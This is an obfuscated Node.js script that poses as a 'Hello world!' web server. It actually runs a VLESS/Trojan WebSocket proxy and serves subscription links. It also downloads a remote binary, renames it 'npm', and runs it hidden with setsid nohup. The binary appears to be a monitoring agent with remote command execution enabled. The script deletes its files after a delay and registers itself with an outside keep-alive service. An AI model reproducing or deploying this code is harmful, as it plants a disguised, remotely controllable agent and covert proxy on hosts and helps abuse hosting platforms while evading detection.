const _0x551173=_0x6a33;(function(_0x45b0ec,_0x364227){const _0x52a7b8=_0x6a33,_0x458df6=_0x45b0ec();while(!![]){try{const _0x20bc59=-parseInt(_0x52a7b8(0x257))/0x1+-parseInt(_0x52a7b8(0x226))/0x2+parseInt(_0x52a7b8(0x236))/0x3*(parseInt(_0x52a7b8(0x201))/0x4)+-parseInt(_0x52a7b8(0x256))/0x5*(-parseInt(_0x52a7b8(0x249))/0x6)+parseInt(_0x52a7b8(0x241))/0x7+parseInt(_0x52a7b8(0x22b))/0x8*(-parseInt(_0x52a7b8(0x224))/0x9)+-parseInt(_0x52a7b8(0x1fe))/0xa*(parseInt(_0x52a7b8(0x22d))/0xb);if(_0x20bc59===_0x364227)break;else _0x458df6['push'](_0x458df6['shift']());}catch(_0x53c872){_0x458df6['push'](_0x458df6['shift']());}}}(_0x3972,0x41b14));const os=require('os'),http=require(_0x551173(0x258)),fs=require('fs'),axios=require(_0x551173(0x218)),net=require(_0x551173(0x20b)),path=require(_0x551173(0x1de)),crypto=require('crypto'),{Buffer}=require('buffer'),{exec,execSync}=require(_0x551173(0x1f2)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x551173(0x25f)][_0x551173(0x230)]||_0x551173(0x23f),NEZHA_SERVER=process[_0x551173(0x25f)][_0x551173(0x228)]||'',NEZHA_PORT=process[_0x551173(0x25f)]['NEZHA_PORT']||'',NEZHA_KEY=process['env'][_0x551173(0x21e)]||'',DOMAIN=process[_0x551173(0x25f)][_0x551173(0x242)]||'1234.abc.com',AUTO_ACCESS=process[_0x551173(0x25f)][_0x551173(0x1f1)]||!![],WSPATH=process[_0x551173(0x25f)][_0x551173(0x220)]||UUID[_0x551173(0x202)](0x0,0x8),SUB_PATH=process[_0x551173(0x25f)][_0x551173(0x217)]||_0x551173(0x1e7),NAME=process[_0x551173(0x25f)][_0x551173(0x21f)]||'Hug',PORT=process[_0x551173(0x25f)][_0x551173(0x24a)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x2293eb=_0x551173;try{const _0x20d6ed=await axios[_0x2293eb(0x1e0)](_0x2293eb(0x208)),_0x5ec20e=_0x20d6ed[_0x2293eb(0x260)];ISP=(_0x5ec20e['country']+'-'+_0x5ec20e[_0x2293eb(0x251)])[_0x2293eb(0x25c)](/ /g,'_');}catch(_0x450854){ISP=_0x2293eb(0x24d);}};GetISP();const httpServer=http[_0x551173(0x22a)]((_0x570149,_0x1f47ff)=>{const _0x119d20=_0x551173;if(_0x570149[_0x119d20(0x20c)]==='/'){const _0x4cd7d3=path[_0x119d20(0x244)](__dirname,_0x119d20(0x205));fs[_0x119d20(0x200)](_0x4cd7d3,_0x119d20(0x1f8),(_0x5a7a2e,_0x49fba9)=>{const _0x1db77e=_0x119d20;if(_0x5a7a2e){_0x1f47ff[_0x1db77e(0x247)](0xc8,{'Content-Type':_0x1db77e(0x21d)}),_0x1f47ff[_0x1db77e(0x229)](_0x1db77e(0x210));return;}_0x1f47ff[_0x1db77e(0x247)](0xc8,{'Content-Type':_0x1db77e(0x21d)}),_0x1f47ff[_0x1db77e(0x229)](_0x49fba9);});return;}else{if(_0x570149['url']==='/'+SUB_PATH){const _0x4bca59=_0x119d20(0x23a)+UUID+'@'+DOMAIN+_0x119d20(0x1fb)+DOMAIN+_0x119d20(0x1ff)+DOMAIN+_0x119d20(0x1df)+WSPATH+'#'+NAME+'-'+ISP,_0x3577f4=_0x119d20(0x262)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x119d20(0x1ff)+DOMAIN+_0x119d20(0x1df)+WSPATH+'#'+NAME+'-'+ISP,_0x300b52=_0x4bca59+'\x0a'+_0x3577f4,_0x168467=Buffer[_0x119d20(0x206)](_0x300b52)[_0x119d20(0x1f3)](_0x119d20(0x248));_0x1f47ff['writeHead'](0xc8,{'Content-Type':_0x119d20(0x214)}),_0x1f47ff[_0x119d20(0x229)](_0x168467+'\x0a');}else _0x1f47ff[_0x119d20(0x247)](0x194,{'Content-Type':_0x119d20(0x214)}),_0x1f47ff[_0x119d20(0x229)](_0x119d20(0x212));}}),wss=new WebSocket[(_0x551173(0x1fa))]({'server':httpServer}),uuid=UUID[_0x551173(0x25c)](/-/g,''),DNS_SERVERS=[_0x551173(0x1fd),_0x551173(0x1f7)];function resolveHost(_0x2f4565){return new Promise((_0x1a83bf,_0x3ff676)=>{const _0x547ca9=_0x6a33;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x547ca9(0x24b)](_0x2f4565)){_0x1a83bf(_0x2f4565);return;}let _0x433728=0x0;function _0x5b40cb(){const _0x16d302=_0x547ca9;if(_0x433728>=DNS_SERVERS[_0x16d302(0x1e9)]){_0x3ff676(new Error(_0x16d302(0x239)+_0x2f4565+_0x16d302(0x1f6)));return;}const _0x3a2459=DNS_SERVERS[_0x433728];_0x433728++;const _0x2bd2f1=_0x16d302(0x204)+encodeURIComponent(_0x2f4565)+_0x16d302(0x1ee);axios[_0x16d302(0x1e0)](_0x2bd2f1,{'timeout':0x1388,'headers':{'Accept':_0x16d302(0x223)}})[_0x16d302(0x1e1)](_0x4c6627=>{const _0x62d40d=_0x16d302,_0xe64fab=_0x4c6627['data'];if(_0xe64fab['Status']===0x0&&_0xe64fab['Answer']&&_0xe64fab['Answer']['length']>0x0){const _0x480419=_0xe64fab[_0x62d40d(0x231)][_0x62d40d(0x20e)](_0x28957e=>_0x28957e[_0x62d40d(0x20f)]===0x1);if(_0x480419){_0x1a83bf(_0x480419[_0x62d40d(0x260)]);return;}}_0x5b40cb();})[_0x16d302(0x255)](_0x3fda31=>{_0x5b40cb();});}_0x5b40cb();});}function handleVlessConnection(_0x5faad9,_0x3e654f){const _0x53a21a=_0x551173,[_0x2be2a6]=_0x3e654f,_0x2544a7=_0x3e654f[_0x53a21a(0x202)](0x1,0x11);if(!_0x2544a7['every']((_0x3caff2,_0x37c27c)=>_0x3caff2==parseInt(uuid['substr'](_0x37c27c*0x2,0x2),0x10)))return![];let _0x28fbdb=_0x3e654f[_0x53a21a(0x202)](0x11,0x12)[_0x53a21a(0x23b)]()+0x13;const _0x255605=_0x3e654f[_0x53a21a(0x202)](_0x28fbdb,_0x28fbdb+=0x2)[_0x53a21a(0x245)](0x0),_0x261bb2=_0x3e654f['slice'](_0x28fbdb,_0x28fbdb+=0x1)[_0x53a21a(0x23b)](),_0x2d54de=_0x261bb2==0x1?_0x3e654f[_0x53a21a(0x202)](_0x28fbdb,_0x28fbdb+=0x4)[_0x53a21a(0x244)]('.'):_0x261bb2==0x2?new TextDecoder()[_0x53a21a(0x221)](_0x3e654f[_0x53a21a(0x202)](_0x28fbdb+0x1,_0x28fbdb+=0x1+_0x3e654f['slice'](_0x28fbdb,_0x28fbdb+0x1)[_0x53a21a(0x23b)]())):_0x261bb2==0x3?_0x3e654f[_0x53a21a(0x202)](_0x28fbdb,_0x28fbdb+=0x10)['reduce']((_0x4d12ed,_0x1804cc,_0x1819f9,_0x2b0392)=>_0x1819f9%0x2?_0x4d12ed[_0x53a21a(0x1e4)](_0x2b0392['slice'](_0x1819f9-0x1,_0x1819f9+0x1)):_0x4d12ed,[])[_0x53a21a(0x238)](_0x5eb7ee=>_0x5eb7ee[_0x53a21a(0x245)](0x0)[_0x53a21a(0x1f3)](0x10))[_0x53a21a(0x244)](':'):'';_0x5faad9[_0x53a21a(0x1ec)](new Uint8Array([_0x2be2a6,0x0]));const _0x3edec2=createWebSocketStream(_0x5faad9);return resolveHost(_0x2d54de)[_0x53a21a(0x1e1)](_0x3a9b86=>{const _0x4fb44f=_0x53a21a;net['connect']({'host':_0x3a9b86,'port':_0x255605},function(){const _0x1d8ade=_0x6a33;this[_0x1d8ade(0x1e5)](_0x3e654f[_0x1d8ade(0x202)](_0x28fbdb)),_0x3edec2['on'](_0x1d8ade(0x24f),()=>{})[_0x1d8ade(0x1eb)](this)['on']('error',()=>{})[_0x1d8ade(0x1eb)](_0x3edec2);})['on'](_0x4fb44f(0x24f),()=>{});})[_0x53a21a(0x255)](_0x2f8106=>{const _0x2fe8fb=_0x53a21a;net[_0x2fe8fb(0x243)]({'host':_0x2d54de,'port':_0x255605},function(){const _0x591a42=_0x2fe8fb;this[_0x591a42(0x1e5)](_0x3e654f[_0x591a42(0x202)](_0x28fbdb)),_0x3edec2['on']('error',()=>{})['pipe'](this)['on']('error',()=>{})[_0x591a42(0x1eb)](_0x3edec2);})['on']('error',()=>{});}),!![];}function handleTrojanConnection(_0x2758c4,_0x2bd35f){const _0x51dbf5=_0x551173;try{if(_0x2bd35f[_0x51dbf5(0x1e9)]<0x3a)return![];const _0x37bc96=_0x2bd35f['slice'](0x0,0x38)['toString'](),_0x447350=[UUID];let _0x2f920b=null;for(const _0x1424db of _0x447350){const _0x199f20=crypto[_0x51dbf5(0x23d)]('sha224')['update'](_0x1424db)[_0x51dbf5(0x252)]('hex');if(_0x199f20===_0x37bc96){_0x2f920b=_0x1424db;break;}}if(!_0x2f920b)return![];let _0x38fd66=0x38;_0x2bd35f[_0x38fd66]===0xd&&_0x2bd35f[_0x38fd66+0x1]===0xa&&(_0x38fd66+=0x2);const _0x31c4ca=_0x2bd35f[_0x38fd66];if(_0x31c4ca!==0x1)return![];_0x38fd66+=0x1;const _0x55559d=_0x2bd35f[_0x38fd66];_0x38fd66+=0x1;let _0x244dbc,_0x355d5d;if(_0x55559d===0x1)_0x244dbc=_0x2bd35f[_0x51dbf5(0x202)](_0x38fd66,_0x38fd66+0x4)[_0x51dbf5(0x244)]('.'),_0x38fd66+=0x4;else{if(_0x55559d===0x3){const _0x8830dd=_0x2bd35f[_0x38fd66];_0x38fd66+=0x1,_0x244dbc=_0x2bd35f[_0x51dbf5(0x202)](_0x38fd66,_0x38fd66+_0x8830dd)['toString'](),_0x38fd66+=_0x8830dd;}else{if(_0x55559d===0x4)_0x244dbc=_0x2bd35f[_0x51dbf5(0x202)](_0x38fd66,_0x38fd66+0x10)[_0x51dbf5(0x22e)]((_0x31e29d,_0x547c0e,_0x456909,_0x470beb)=>_0x456909%0x2?_0x31e29d[_0x51dbf5(0x1e4)](_0x470beb[_0x51dbf5(0x202)](_0x456909-0x1,_0x456909+0x1)):_0x31e29d,[])[_0x51dbf5(0x238)](_0x599481=>_0x599481['readUInt16BE'](0x0)[_0x51dbf5(0x1f3)](0x10))['join'](':'),_0x38fd66+=0x10;else return![];}}_0x355d5d=_0x2bd35f['readUInt16BE'](_0x38fd66),_0x38fd66+=0x2;_0x38fd66<_0x2bd35f[_0x51dbf5(0x1e9)]&&_0x2bd35f[_0x38fd66]===0xd&&_0x2bd35f[_0x38fd66+0x1]===0xa&&(_0x38fd66+=0x2);const _0x21ce6e=createWebSocketStream(_0x2758c4);return resolveHost(_0x244dbc)[_0x51dbf5(0x1e1)](_0x2a8718=>{const _0x244d54=_0x51dbf5;net[_0x244d54(0x243)]({'host':_0x2a8718,'port':_0x355d5d},function(){const _0x1ae5b4=_0x244d54;_0x38fd66<_0x2bd35f[_0x1ae5b4(0x1e9)]&&this['write'](_0x2bd35f[_0x1ae5b4(0x202)](_0x38fd66)),_0x21ce6e['on'](_0x1ae5b4(0x24f),()=>{})[_0x1ae5b4(0x1eb)](this)['on'](_0x1ae5b4(0x24f),()=>{})[_0x1ae5b4(0x1eb)](_0x21ce6e);})['on'](_0x244d54(0x24f),()=>{});})['catch'](_0xe47387=>{const _0x3f1fdb=_0x51dbf5;net[_0x3f1fdb(0x243)]({'host':_0x244dbc,'port':_0x355d5d},function(){const _0x396182=_0x3f1fdb;_0x38fd66<_0x2bd35f[_0x396182(0x1e9)]&&this['write'](_0x2bd35f['slice'](_0x38fd66)),_0x21ce6e['on']('error',()=>{})[_0x396182(0x1eb)](this)['on'](_0x396182(0x24f),()=>{})[_0x396182(0x1eb)](_0x21ce6e);})['on'](_0x3f1fdb(0x24f),()=>{});}),!![];}catch(_0x36a0dc){return![];}}wss['on'](_0x551173(0x23e),(_0x26a9ae,_0x3b92f7)=>{const _0x293d14=_0x551173,_0x395f8b=_0x3b92f7[_0x293d14(0x20c)]||'';_0x26a9ae[_0x293d14(0x1ea)]('message',_0x12dc63=>{const _0x1c8cbe=_0x293d14;if(_0x12dc63[_0x1c8cbe(0x1e9)]>0x11&&_0x12dc63[0x0]===0x0){const _0x356eaa=_0x12dc63[_0x1c8cbe(0x202)](0x1,0x11),_0x44c085=_0x356eaa['every']((_0x109aca,_0x36990c)=>_0x109aca==parseInt(uuid[_0x1c8cbe(0x254)](_0x36990c*0x2,0x2),0x10));if(_0x44c085){!handleVlessConnection(_0x26a9ae,_0x12dc63)&&_0x26a9ae['close']();return;}}!handleTrojanConnection(_0x26a9ae,_0x12dc63)&&_0x26a9ae[_0x1c8cbe(0x25a)]();})['on'](_0x293d14(0x24f),()=>{});});function _0x6a33(_0x35a366,_0x122044){const _0x3972a9=_0x3972();return _0x6a33=function(_0x6a3342,_0x5a07ad){_0x6a3342=_0x6a3342-0x1dd;let _0x1d9f0e=_0x3972a9[_0x6a3342];return _0x1d9f0e;},_0x6a33(_0x35a366,_0x122044);}function _0x3972(){const _0x2238e1=['connection','e21ddcdb-f6a3-4979-9b46-cdc8d895e4dd','writeFileSync','3358929qqfcLT','DOMAIN','connect','join','readUInt16BE','application/json','writeHead','base64','3762DkPVyZ','PORT','test','finish','Unknown','--tls','error','chmod\x20+x\x20npm','asOrganization','digest','config.yaml','substr','catch','1135PrheKN','137332gZlKFv','http','/bin/bash','close','post','replace','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','https://arm64.ssss.nyc.mn/v1','env','data','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','trojan://','https://oooo.serv00.net/add-url','path','&path=%2F','get','then','npm','setsid\x20nohup\x20./npm\x20-s\x20','concat','write','false','sub','arch','length','once','pipe','send','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','&type=A','arm64','\x20-p\x20','AUTO_ACCESS','child_process','toString','2096','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','\x20with\x20all\x20DNS\x20servers','1.1.1.1','utf8','stream','Server',':443?encryption=none&security=tls&sni=','log','8.8.4.4','3015940jtJutW','&fp=chrome&type=ws&host=','readFile','52RrKjOA','slice','true','https://dns.google/resolve?name=','index.html','from','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','https://speed.cloudflare.com/meta','createWriteStream','npm\x20download\x20successfully','net','url','aarch64','find','type','Hello\x20world!','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','Not\x20Found\x0a','https://amd64.ssss.nyc.mn/v1','text/plain','arm','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','SUB_PATH','axios','Server\x20is\x20running\x20on\x20port\x20','utf-8','pop','split','text/html','NEZHA_KEY','NAME','WSPATH','decode','trim','application/dns-json','20637fkSoEA','8443','494984yuFFdN','npm\x20is\x20running','NEZHA_SERVER','end','createServer','232QnVYxs','npm\x20running\x20error:','11mhOzzu','reduce','unlink','UUID','Answer','https://arm64.ssss.nyc.mn/agent','2083','includes','Automatic\x20Access\x20Task\x20added\x20successfully','92265jNrilG','https://amd64.ssss.nyc.mn/agent','map','Failed\x20to\x20resolve\x20','vless://','readUInt8','2087','createHash'];_0x3972=function(){return _0x2238e1;};return _0x3972();}const getDownloadUrl=()=>{const _0x2daecb=_0x551173,_0x3b0516=os[_0x2daecb(0x1e8)]();return _0x3b0516===_0x2daecb(0x215)||_0x3b0516===_0x2daecb(0x1ef)||_0x3b0516===_0x2daecb(0x20d)?!NEZHA_PORT?_0x2daecb(0x25e):_0x2daecb(0x232):!NEZHA_PORT?_0x2daecb(0x213):_0x2daecb(0x237);},downloadFile=async()=>{const _0x20772c=_0x551173;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x167370=getDownloadUrl(),_0x3ec145=await axios({'method':'get','url':_0x167370,'responseType':_0x20772c(0x1f9)}),_0x2ec257=fs[_0x20772c(0x209)](_0x20772c(0x1e2));return _0x3ec145[_0x20772c(0x260)][_0x20772c(0x1eb)](_0x2ec257),new Promise((_0x25f509,_0x5b56ed)=>{const _0x5778f0=_0x20772c;_0x2ec257['on'](_0x5778f0(0x24c),()=>{const _0x518312=_0x5778f0;console[_0x518312(0x1fc)](_0x518312(0x20a)),exec(_0x518312(0x250),_0x4b4c9e=>{if(_0x4b4c9e)_0x5b56ed(_0x4b4c9e);_0x25f509();});}),_0x2ec257['on']('error',_0x5b56ed);});}catch(_0x473a11){throw _0x473a11;}},runnz=async()=>{const _0x11a9c8=_0x551173;try{const _0x70ea93=execSync(_0x11a9c8(0x25d),{'encoding':_0x11a9c8(0x21a)});if(_0x70ea93[_0x11a9c8(0x222)]()!==''){console[_0x11a9c8(0x1fc)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x20f67d){}await downloadFile();let _0x2c0dcc='',_0x2e917d=['443',_0x11a9c8(0x225),_0x11a9c8(0x1f4),_0x11a9c8(0x23c),_0x11a9c8(0x233),'2053'];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0xe4be57=_0x2e917d['includes'](NEZHA_PORT)?_0x11a9c8(0x24e):'';_0x2c0dcc=_0x11a9c8(0x1e3)+NEZHA_SERVER+':'+NEZHA_PORT+_0x11a9c8(0x1f0)+NEZHA_KEY+'\x20'+_0xe4be57+_0x11a9c8(0x207);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0xb71bf=NEZHA_SERVER[_0x11a9c8(0x234)](':')?NEZHA_SERVER[_0x11a9c8(0x21c)](':')[_0x11a9c8(0x21b)]():'',_0x3fa5ec=_0x2e917d[_0x11a9c8(0x234)](_0xb71bf)?_0x11a9c8(0x203):_0x11a9c8(0x1e6),_0x279218='client_secret:\x20'+NEZHA_KEY+_0x11a9c8(0x1ed)+NEZHA_SERVER+_0x11a9c8(0x211)+_0x3fa5ec+_0x11a9c8(0x1f5)+UUID;fs[_0x11a9c8(0x240)](_0x11a9c8(0x253),_0x279218);}_0x2c0dcc=_0x11a9c8(0x261);}else{console[_0x11a9c8(0x1fc)](_0x11a9c8(0x216));return;}}try{exec(_0x2c0dcc,{'shell':_0x11a9c8(0x259)},_0x1233c9=>{const _0x3566df=_0x11a9c8;if(_0x1233c9)console[_0x3566df(0x24f)](_0x3566df(0x22c),_0x1233c9);else console[_0x3566df(0x1fc)](_0x3566df(0x227));});}catch(_0x319c83){console['error']('error:\x20'+_0x319c83);}};async function addAccessTask(){const _0x536791=_0x551173;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x42ca7b='https://'+DOMAIN;try{const _0x389955=await axios[_0x536791(0x25b)](_0x536791(0x1dd),{'url':_0x42ca7b},{'headers':{'Content-Type':_0x536791(0x246)}});console[_0x536791(0x1fc)](_0x536791(0x235));}catch(_0x7b0573){}}const delFiles=()=>{const _0x266189=_0x551173;fs[_0x266189(0x22f)](_0x266189(0x1e2),()=>{}),fs[_0x266189(0x22f)]('config.yaml',()=>{});};httpServer['listen'](PORT,()=>{const _0x584c58=_0x551173;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log'](_0x584c58(0x219)+PORT);});
